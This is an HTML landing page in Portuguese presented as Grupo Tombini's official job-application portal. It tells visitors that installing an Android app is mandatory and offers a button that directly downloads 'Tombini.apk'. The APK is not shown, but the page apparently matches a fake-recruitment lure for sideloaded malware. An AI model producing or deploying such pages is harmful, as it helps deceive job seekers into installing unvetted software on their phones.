<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Grupo Tombini | Aplicativo de Candidatura</title>
  <meta name="description" content="Para se candidatar às vagas do Grupo Tombini, é obrigatório instalar o aplicativo oficial." />

  <style>
    :root{
      /* Azul principal (ajuste fino se quiser) */
      --blue: #2563eb;
      --blue2:#1d4ed8;

      /* Base branca */
      --bg: #ffffff;
      --text: #0f172a;
      --muted: #475569;

      --border: rgba(15,23,42,.12);
      --card: rgba(255,255,255,.86);
      --shadow: 0 18px 42px rgba(2,6,23,.12);
      --radius: 18px;
      --max: 560px;
    }

    *{ box-sizing: border-box; }

    body{
      margin:0;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      color: var(--text);
      background: var(--bg);
      overflow-x: hidden;
      position: relative;
    }

    /* Imagem do caminhão no fundo (discreta) */
    body::before{
      content:"";
      position: fixed;
      inset: 0;
      background-image: url("caminhao.jpg"); /* se for png, troque para caminhao.png */
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;

      /* deixa a imagem suave pra não competir com o conteúdo */
      opacity: 0.14;

      /* leve desaturação e contraste controlado */
      filter: grayscale(20%) contrast(1.02);
      pointer-events:none;
      z-index: 0;
    }

    /* Camada branca + leve azul para identidade */
    body::after{
      content:"";
      position: fixed;
      inset: 0;
      background:
        radial-gradient(900px 600px at 10% 0%, rgba(37,99,235,.10), transparent 60%),
        linear-gradient(180deg, rgba(255,255,255,.92), rgba(255,255,255,.98));
      pointer-events:none;
      z-index: 0;
    }

    .wrap{
      width: min(var(--max), calc(100% - 40px));
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 24px;
      box-shadow: var(--shadow);
      padding: 28px;
      text-align: center;
      position: relative;
      z-index: 1;
      backdrop-filter: blur(6px);
    }

    header{
      margin-bottom: 16px;
    }

    .logo{
      width: 68px;
      height: 68px;
      margin: 0 auto 10px;
      display:flex;
      align-items:center;
      justify-content:center;
      border-radius: 16px;
      background: rgba(37,99,235,.06);
      border: 1px solid rgba(37,99,235,.18);
    }

    .logo img{
      max-width: 70%;
      max-height: 70%;
      object-fit: contain;
    }

    header h1{
      margin: 0;
      font-size: 18px;
      letter-spacing: .3px;
      font-weight: 900;
      color: var(--text);
    }

    .badge{
      display:inline-block;
      margin: 14px auto 10px;
      padding: 8px 12px;
      border-radius: 999px;
      border: 1px solid rgba(37,99,235,.22);
      background: rgba(37,99,235,.06);
      color: #1e3a8a;
      font-size: 13px;
      font-weight: 700;
    }

    h2{
      margin: 10px 0 8px;
      font-size: 28px;
      line-height: 1.1;
      letter-spacing: -0.4px;
      color: var(--text);
    }

    p{
      margin: 0 0 18px;
      color: var(--muted);
      font-size: 15.5px;
      line-height: 1.6;
    }

    /* ÚNICO botão principal (CTA) */
    .btn{
      width: 100%;
      padding: 16px;
      border-radius: 14px;
      border: 1px solid rgba(37,99,235,.22);
      background: linear-gradient(135deg, var(--blue), #6aa8ff);
      color: #ffffff;
      font-weight: 900;
      font-size: 16px;
      cursor: pointer;
      box-shadow: 0 14px 26px rgba(37,99,235,.22);
      transition: transform .15s ease, filter .15s ease;
    }
    .btn:hover{
      transform: translateY(-1px);
      filter: brightness(1.02);
    }
    .btn:focus{
      outline: 3px solid rgba(37,99,235,.25);
      outline-offset: 2px;
    }

    .note{
      margin-top: 14px;
      font-size: 12.8px;
      color: #64748b;
    }

    footer{
      margin-top: 18px;
      font-size: 12.5px;
      color: #64748b;
    }

    /* Mobile */
    @media (max-width: 420px){
      .wrap{ padding: 22px; }
      h2{ font-size: 26px; }
    }
  </style>
</head>

<body>
  <div class="wrap">
    <header>
      <div class="logo">
        <img src="logotipo.png" alt="Grupo Tombini">
      </div>
      <h1>Grupo Tombini</h1>
    </header>

    <div class="badge">Processo oficial de candidatura</div>

    <h2>Instale o aplicativo</h2>

    <p>
      Para se candidatar às vagas do <strong>Grupo Tombini</strong>,
      é <strong>obrigatório</strong> instalar o aplicativo oficial.
      Todo o processo é feito exclusivamente pelo app.
    </p>

    <button class="btn" onclick="baixar()">Baixar aplicativo</button>

    <div class="note">
      Android • Download direto • Aplicativo oficial
    </div>

    <footer>
      © <span id="year"></span> Grupo Tombini
    </footer>
  </div>

  <script>
    function baixar(){
      window.location.href = "Tombini.apk";
    }
    document.getElementById("year").textContent = new Date().getFullYear();
  </script>
</body>
</html>
